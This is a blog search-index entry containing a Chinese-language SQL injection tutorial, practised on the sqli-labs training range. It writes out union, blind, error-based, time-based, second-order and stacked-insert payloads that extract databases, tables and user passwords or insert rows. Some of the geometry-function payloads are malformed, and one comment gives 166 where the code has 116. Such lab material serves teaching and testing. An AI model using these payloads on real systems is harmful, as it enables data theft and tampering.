<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MySQL_injection</title>
    <url>/MySQL-injection.html</url>
    <content><![CDATA[<h2 id="1、SQL注入原理"><a href="#1、SQL注入原理" class="headerlink" title="1、SQL注入原理"></a>1、SQL注入原理</h2><pre><code>当服务器把用户输入的字符串当作SQL语句去执行时，就会产生注入。
</code></pre>
<h2 id="2、注入的类型"><a href="#2、注入的类型" class="headerlink" title="2、注入的类型"></a>2、注入的类型</h2><p>常见的注入分为7类:  </p>
<ul>
<li>联合注入  </li>
<li>盲注  </li>
<li>报错注入  </li>
<li>延时注入</li>
<li>二次注入</li>
<li>堆叠注入</li>
<li>宽字节注入</li>
</ul>
<span id="more"></span>

<h2 id="3、常见的注入利用方式"><a href="#3、常见的注入利用方式" class="headerlink" title="3、常见的注入利用方式"></a>3、常见的注入利用方式</h2><ul>
<li>测试环境：SQlilabs靶场 </li>
</ul>
<h3 id="一-、判断注入"><a href="#一-、判断注入" class="headerlink" title="(一)、判断注入"></a>(一)、判断注入</h3><p>首先判断注入点是否存在，当发现一个URL为：<span class="exturl" data-url="aHR0cDovL3h4eC5jb20vP2lkPTE=">http://xxx.com/?id=1<i class="fa fa-external-link-alt"></i></span><br>则可以改变id的值，使用(+、-、’、”、’)、”)、and 1=1 、or 1=1 )这些字符来观察页面是否会随着值的变化而改变。<br>后端处理SQL查询的语句一般为:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx <span class="keyword">from</span> xxx <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>；</span><br></pre></td></tr></table></figure>

<p>由图一可以看到页面报错了，由与加入了单引号’ ，SQL解析了这个单引号，但发现没有第二个单引号来与它闭合，所有就会抛出这个错误。  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：  	</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<center>
<img src="/MySQL-injection/1.png" widith="50%">图一
</center>  

<p>然后使用 and 1=1 , 1=2 判断注入点，查看页面回显是否正常。<br>注意要·使用注释符把后面的语句给注释掉，如果不注释掉后面的语句，则我们无法知道我们输入SQL语句是否正常执行。   </p>
<pre><code>常见的注释符号：  
--   
--+   
#   
%23   
</code></pre>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+  </span></span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/2.png" widith="50%">图二
</center>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http://192.168.199.129:86/Less-1/?id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/3.png" widith="50%">图三
</center>  


<h3 id="二-、联合注入"><a href="#二-、联合注入" class="headerlink" title="(二)、联合注入"></a>(二)、联合注入</h3><h4 id="1、利用注入点"><a href="#1、利用注入点" class="headerlink" title="1、利用注入点"></a>1、利用注入点</h4><p>联合查询有两个条件：  </p>
<ul>
<li>两张虚拟的表需要有相同的列数。</li>
<li>虚拟表对应列的数据类型要相同。</li>
</ul>
<p>所以我们想要构建联合查询的表我们就需要先判断当前表有多少列，就要使用 order by 来判断当前表有多少列。<br>一般使用二分法来快速的判断，例如：order by 100(报错),则下一个使用 order by 50 来判断。<br>由下图可以得出，当 order by 3 时，页面正常，order by 4时，则页面报错。可以得出当前表中的列数是3。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>
<center>页面正常 
<img src="/MySQL-injection/4.png" widith="50%">
</center>  
    
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>
<center>页面错误 
<img src="/MySQL-injection/4.png" widith="50%">
</center>  


<h4 id="2、查找显错位"><a href="#2、查找显错位" class="headerlink" title="2、查找显错位"></a>2、查找显错位</h4><p>知道了当前表的列数我们就开始判断第几列的内容会显示到页面中来。</p>
<p>在这里我们需要知道，我们构建union select语句时，当前面的查询语句为假，也就是数据不存在时，union select之后查询出的结果就会显示在页面中。这里我们可以通过在前面查询语句中添加 and 1=2 使语句变假，也可以直接将id传入一个负数，来使语句变假。<br>由下图可以看到，2和3可以在网页上输出。<br>注：有时列数多的时候，显错位会藏在页面的源码中，要右键审查元素查找，所有一般可以使用一些字符串(null,hello)来显示会方便查找，然后在页面源码中搜索哪里出现了这些特定的字符串就是显错位。</p>
<pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句:</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
</code></pre>
<center>
<img src="/MySQL-injection/6.png" widith="50%">
</center>

<h4 id="3、查看当前数据库"><a href="#3、查看当前数据库" class="headerlink" title="3、查看当前数据库"></a>3、查看当前数据库</h4><p>使用 database()和version()函数分别输出当前的数据库名和版本<br>注：<br>1、 information_schema是系统的自带库，所有的数据库的信息都存放在里面。</p>
<p>2、group_concat 表示一次性查出的东西 ，也可以使用 limit 排序查出。  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：    </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),version() --+</span></span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/7.png" widith="50%">
</center>

 
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查看所有数据库  </span><br><span class="line">语句:</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(schema_name) from  information_schema.schemata --+</span></span><br></pre></td></tr></table></figure>

<h4 id="4、查看当前数据库下的所有的表"><a href="#4、查看当前数据库下的所有的表" class="headerlink" title="4、查看当前数据库下的所有的表"></a>4、查看当前数据库下的所有的表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() --+ </span></span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/8.png" widith="50%">
</center>

<h4 id="5、查看表中存在的字段名"><a href="#5、查看表中存在的字段名" class="headerlink" title="5、查看表中存在的字段名"></a>5、查看表中存在的字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句:   </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27;--+  </span></span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/10.png" widith="50%">
</center>

<h4 id="6、查看特定字段中的数据"><a href="#6、查看特定字段中的数据" class="headerlink" title="6、查看特定字段中的数据"></a>6、查看特定字段中的数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(password) from security.users--+</span></span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/11.png" widith="50%">
</center>

<h3 id="三-、盲注"><a href="#三-、盲注" class="headerlink" title="(三)、盲注"></a>(三)、盲注</h3><pre><code>什么是盲注?
盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
</code></pre>
<h4 id="1、盲注中常用的函数"><a href="#1、盲注中常用的函数" class="headerlink" title="1、盲注中常用的函数"></a>1、盲注中常用的函数</h4><ol>
<li><p>mid() : 从文本字段中提取字符。<br> 用法 ： select mid(column_name,start,length) from table_name;  ·<br> 注 ： column_name（必需，要提取的字符字段）、start（必需，起始位置）、length（可选，要返回几个字符数）</p>
</li>
<li><p>substr() 和 substring() : 截取字符串</p>
<p> 用法 ： string substring(string,start,length)<br> string  substr(string ,start,length)</p>
<p> 注 ： 用法与mid（）相同。  </p>
</li>
<li><p>left() ：截取字符串左部指定个数的字符</p>
<p> 用法 ：left(string，n)；<br> 注 ： string为要截取的字符串 ，n为长度</p>
</li>
<li><p>ORD() : 返回字符串第一个字符的ASCII值</p>
<p> 用法 ：ORD（string）</p>
<p> 注 ： 常用于与上述函数搭配，和ASCII()作用相同。``</p>
</li>
<li><p>length() : 返回字符串长度</p>
</li>
</ol>
<h4 id="2、判断当前数据库"><a href="#2、判断当前数据库" class="headerlink" title="2、判断当前数据库"></a>2、判断当前数据库</h4><p>使用length()判断当前数据库名的长度由多少个字符组成。</p>
<pre><code>语句:  
http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) &gt; 7 --+ 页面正常
http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 7 --+ 页面错误
http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 8 --+ 页面正常
这里判断是大于7却不等于7，那长度就是8了·
</code></pre>
<center>
<img src="/MySQL-injection/12.png" widith="50%">
</center>

<h4 id="3、猜测数据库名"><a href="#3、猜测数据库名" class="headerlink" title="3、猜测数据库名"></a>3、猜测数据库名</h4><p>使用left()函数猜数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">注：一般取中间来猜</span><br><span class="line">语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left(database(),1) =&#x27;</span>s<span class="string">&#x27; --+ 页面正常 </span></span><br><span class="line"><span class="string">数据库名的第一个字母为s，因为数据库名是:security</span></span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/13.png" widith="50%">
</center>

<h4 id="4、猜测表"><a href="#4、猜测表" class="headerlink" title="4、猜测表"></a>4、猜测表</h4><p>使用ascii()函数来把猜测的字母转成ascii</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ascii (substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span> ),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;=</span><span class="number">101</span> <span class="comment">--+  </span></span><br><span class="line"></span><br><span class="line">ascii码 <span class="number">101</span> 对应的是字母 e</span><br><span class="line"></span><br><span class="line">猜解第二个字母：</span><br><span class="line"><span class="keyword">and</span> ORD (mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span> ),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span><span class="number">109</span> <span class="comment">--+（这里是m）</span></span><br><span class="line"></span><br><span class="line">说明： 这里将第一张表的第一个字母的ascii码解出来 、当要查第二个表的时候只要排序即可（limit <span class="number">1</span>,<span class="number">1</span>）</span><br><span class="line"></span><br><span class="line">注意 ： ascii 可以使用ORD代替、substr可使用substring、mid代替</span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/14.png" widith="50%">
</center>

<h4 id="5、猜测列名"><a href="#5、猜测列名" class="headerlink" title="5、猜测列名"></a>5、猜测列名</h4><p>使用regexp()猜测表下的列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> column_name regexp <span class="string">&#x27;^u[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">注：<span class="number">1</span>表示只是为了提高运行的效率查到多少就返回多少</span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/15.png" widith="50%">
</center>

<h4 id="6、获取列中的数据"><a href="#6、获取列中的数据" class="headerlink" title="6、获取列中的数据"></a>6、获取列中的数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ORD(MID((<span class="keyword">SELECT</span><span class="operator">%</span><span class="number">20</span>IFNULL(<span class="built_in">CAST</span>(username <span class="keyword">AS</span> <span class="type">CHAR</span>),<span class="number">0x20</span>)<span class="keyword">FROM</span> security.users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span> <span class="number">68</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<center>
<img src="/MySQL-injection/16.png" widith="50%">
</center>


<h3 id="四-、报错注入"><a href="#四-、报错注入" class="headerlink" title="(四)、报错注入"></a>(四)、报错注入</h3><h4 id="1、通过floor报错"><a href="#1、通过floor报错" class="headerlink" title="1、通过floor报错"></a>1、通过floor报错</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查询数据版本</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;)%20 and (select 1 from (select count(*),concat( (select (select ( select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x%20 from information_schema.tables group by x )a) --+</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"># 查看当前连接用户</span><br><span class="line">?id=-1&quot;)<span class="operator">%</span><span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat( (<span class="keyword">select</span> (<span class="keyword">select</span> ( <span class="keyword">select</span> concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x<span class="operator">%</span><span class="number">20</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a) <span class="comment">--+</span></span><br><span class="line">	</span><br><span class="line"># 查看当前连接的数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and (select 1 from (select count(*),concat( (select (select ( select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x%20 from information_schema.tables group by x )a) --+、</span><br><span class="line">	</span><br><span class="line"># 查看所有数据库</span><br><span class="line">?id=1&quot;)<span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br><span class="line">	</span><br><span class="line"># 查看表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br><span class="line">	</span><br><span class="line">#查看字段</span><br><span class="line">?id=1&quot;) <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,column_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>vqu8obn5z9 LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br><span class="line">	</span><br><span class="line">#查看内容</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="2、通过-Extractvalue-报错"><a href="#2、通过-Extractvalue-报错" class="headerlink" title="2、通过 Extractvalue 报错"></a>2、通过 Extractvalue 报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line"># 第一种</span><br><span class="line"><span class="keyword">and</span> extractvalue (<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> database() limit <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"># 第二种</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span>),<span class="number">0x7e</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="3、通过updatexml-报错"><a href="#3、通过updatexml-报错" class="headerlink" title="3、通过updatexml 报错"></a>3、通过updatexml 报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> database())),<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="4、通过-Name-const-报错"><a href="#4、通过-Name-const-报错" class="headerlink" title="4、通过 Name_const 报错"></a>4、通过 Name_const 报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line"> # 语句</span><br><span class="line"> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (selectname_const(<span class="keyword">select</span> @<span class="variable">@version</span>,<span class="number">0</span>))a <span class="keyword">join</span> (<span class="keyword">select</span> name_const(@<span class="variable">@version</span>,<span class="number">0</span>))b)c) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="5、通过join报错"><a href="#5、通过join报错" class="headerlink" title="5、通过join报错"></a>5、通过join报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="6、通过exp报错"><a href="#6、通过exp报错" class="headerlink" title="6、通过exp报错"></a>6、通过exp报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">exp</span> (<span class="operator">~</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> database()) a))</span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="7、通过-GeometryCollection-报错"><a href="#7、通过-GeometryCollection-报错" class="headerlink" title="7、通过 GeometryCollection()报错"></a>7、通过 GeometryCollection()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> GeometryCollection(()<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span> () )a)b );</span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="8、通过polygon报错"><a href="#8、通过polygon报错" class="headerlink" title="8、通过polygon报错"></a>8、通过polygon报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> polygon (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span> ())a)b );</span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="9、通过multipoint-报错"><a href="#9、通过multipoint-报错" class="headerlink" title="9、通过multipoint ()报错"></a>9、通过multipoint ()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> multipoint (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="10、通过multlinestring-报错"><a href="#10、通过multlinestring-报错" class="headerlink" title="10、通过multlinestring ()报错"></a>10、通过multlinestring ()报错</h4><pre><code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="11、通过multpolygon-报错"><a href="#11、通过multpolygon-报错" class="headerlink" title="11、通过multpolygon ()报错"></a>11、通过multpolygon ()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> multpolygon (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
</code></pre>
<h4 id="12、通过linestring-报错"><a href="#12、通过linestring-报错" class="headerlink" title="12、通过linestring ()报错"></a>12、通过linestring ()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> linestring (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br></pre></td></tr></table></figure>
</code></pre>
<h3 id="五-、延时注入"><a href="#五-、延时注入" class="headerlink" title="(五)、延时注入"></a>(五)、延时注入</h3><p>延时注入的原理和盲注差不多。<br>    <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语句</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1)) =116,1,sleep(10))--+</span></span><br><span class="line"><span class="string">and if(ascii(语句)) =116,正常的返回值,不正常返回值)</span></span><br><span class="line"><span class="string">如果数据库名的第一字母的ascii等于166则返回1，否则延时10秒</span></span><br><span class="line"><span class="string">and if(ascii(substr(database(),1,1)) =116,sleep(10),1)</span></span><br><span class="line"><span class="string">这样写的话就是如果ascii等于166，则页面延时10秒，否则返回1</span></span><br></pre></td></tr></table></figure></p>
<center>
<img src="/MySQL-injection/17.png" widith="50%">
</center>

<h3 id="六-、二次注入"><a href="#六-、二次注入" class="headerlink" title="(六)、二次注入"></a>(六)、二次注入</h3><p>二次注入产生的原理：当我们第一次存储数据进数据库时，执行的sql语句会经过一层校验，把敏感的字符给转义了。但是当数据存储进数据库时。它把数据还原为转义前的数据。当某个地方要取出数据时，取出去的数据就是这些恶意的语句，这次就会产生二次注入。</p>
<h4 id="1、靶场测试"><a href="#1、靶场测试" class="headerlink" title="1、靶场测试"></a>1、靶场测试</h4><p>这是当前数据库里存储的账号密码</p>
<center>
<img src="/MySQL-injection/18.png" widith="50%">
</center>

<p>这时去注册一个账号，注册账号为：admin’– -</p>
<center>
<img src="/MySQL-injection/19.png" widith="50%">
</center>
然后在去数据库查看存储的账号密码，可以看到输入的账号已经给存入数据库了，使用这个账号密码就可以登陆

<center>
<img src="/MySQL-injection/20.png" widith="50%">
</center>

<p>下一步我们就去修改账号密码</p>
<center>
<img src="/MySQL-injection/21.png" widith="50%">
</center>

<p>然后我们去查看数据库里的数据，这时发现账号:admin’ – 这个账号的密码没变，但是账号：admin的密码却从原来的admin变成了12345<br>原理是：密码修改页面，它仅对特殊字符进行了转义，判断输入两次密码是否一致，然后将用户键入，将数据插入至数据库。就是因为它相信了数据库存的数据是正常，直接把数据拿来用了。就会产生这种注入。</p>
<center>
<img src="/MySQL-injection/22.png" widith="50%">
</center>

<h3 id="七-、堆叠注入"><a href="#七-、堆叠注入" class="headerlink" title="(七)、堆叠注入"></a>(七)、堆叠注入</h3><p>原理：就是将原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的sql语句了，这个时候我们使用增删查改毫无限制。<br>使用条件：<br>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，<br>利用mysqli_multi_query()函数就支持多条sql语句同时执行，<br>但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，<br>其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<h4 id="1、靶场练习"><a href="#1、靶场练习" class="headerlink" title="1、靶场练习"></a>1、靶场练习</h4><p>用分号结束前面的语句，在后面插入我们的语句，这里我们向user表里添加一条新的用户数据<br>    <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; insert into users(id,username,password) value (123,&#x27;</span>aka<span class="string">&#x27;,&#x27;</span>aka<span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure></p>
<center>
<img src="/MySQL-injection/23.png" widith="50%">
</center>
可以看到已经添加成功
<center>
<img src="/MySQL-injection/24.png" widith="50%">
</center>

